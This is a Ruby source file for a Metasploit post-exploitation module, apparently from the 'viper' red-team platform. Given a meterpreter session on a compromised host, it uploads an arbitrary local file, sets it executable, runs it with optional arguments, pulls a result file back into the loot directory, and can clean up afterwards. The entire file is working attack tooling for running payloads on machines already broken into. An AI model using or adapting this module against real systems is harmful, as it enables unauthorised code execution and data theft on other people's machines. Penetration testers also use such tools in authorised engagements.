##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Upload and Execute',
                      'Description'  => %q{Push a file and execute it.},
                      'Author'       => 'viper',
                      'License'      => MSF_LICENSE,
                      'Platform'     => ['win', 'unix', 'linux', 'osx', 'bsd', 'solaris'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options([
                             OptString.new('LPATH', [true, 'Local file path to upload and execute']),
                             OptString.new('RPATH', [false, 'Remote file path on target (default is basename of LPATH)']),
                             OptString.new('RESULTFILE', [false, 'exe/elf execute result file on target']),
                             OptString.new('ARGS', [false, 'Command-line arguments to pass to the uploaded file']),
                             OptInt.new('TIMEOUT', [true, 'Timeout for command execution', 1800]),
                             OptBool.new('CLEANUP', [false, 'Cleanup upload file after exec', false]),
                     ])
  end

  def run

    if session.type == "shell"
      pub_json_result(false,
                      "Unsupport shell type",
                      nil,
                      self.uuid)
      return
    end
    if File.file?(File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH']))
      script_path = File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH'])
    elsif File.file?(File.join(Msf::Config.loot_directory, datastore['LPATH']))
      script_path = File.join(Msf::Config.loot_directory, datastore['LPATH'])
    elsif File.file?(datastore['LPATH'])
      script_path = datastore['LPATH']
    else
      pub_json_result(false,
                      "#{datastore['LPATH']} not found",
                      nil,
                      self.uuid)
      return
    end

    tmprpath = rpath
    unless session.fs.file.exist?(tmprpath)
      session.fs.file.upload_file(tmprpath, script_path) do |step, src, dst|
        print_status_redis("#{step.ljust(11)}: #{src} -> #{dst}")
      end
    end

    if session.platform == 'windows'
      # Don't use cmd.exe /c start so we can fetch output
      cmd = tmprpath
    else
      # Set 700 so only we can execute the file
      chmod(tmprpath, 0700)

      # Handle absolute paths
      cmd = tmprpath.start_with?('/') ? tmprpath : "./#{tmprpath}"
    end
    print_status_redis("Executing command: #{cmd} #{args}")
    output = cmd_exec(cmd, args, datastore['TIMEOUT'])

    if datastore['CLEANUP']
      register_file_for_cleanup(tmprpath)
    end
    localfile = nil
    if !datastore['RESULTFILE'].blank?
      resultfilepath = File.join(session.fs.dir.pwd, datastore['RESULTFILE'])
      localfile      = Time.now.to_i.to_s + "-" + datastore['RESULTFILE'].delete('/\\')
      localpath      = File.join(Msf::Config.loot_directory, localfile)
      begin
        # Download the remote file to the temporary file
        print_status_redis("Downloading #{resultfilepath} to #{localpath}")
        opts = {
                :block_size => 24 * 1024,
                :tries      => true,
                :tries_no   => 10,
        }
        session.fs.file.download_file(localpath, resultfilepath, opts) do |step, src, dst|
          print_status_redis("#{step.ljust(11)}: #{src} -> #{dst}")
        end

        register_file_for_cleanup(resultfilepath)
      rescue Rex::Post::Meterpreter::RequestError => re
        print_error(re.to_s)
      end
    end
    pub_json_result(true,
                    localfile,
                    output,
                    self.uuid)
  end

  def lpath
    datastore['LPATH']
  end

  # datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
  # datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']

  def rpath
    if datastore['RPATH'].blank?
      if session.platform == "windows"
        filename = '/' + Time.now.to_i.to_s + ".exe"
      else
        filename = '/' + Time.now.to_i.to_s
      end
    else
      filename = datastore['RPATH']
    end
    rpath = File.join(session.fs.dir.pwd, filename)
    rpath
  end

  def args
    datastore['ARGS']
  end

  def timeout
    datastore['TIMEOUT']
  end
end
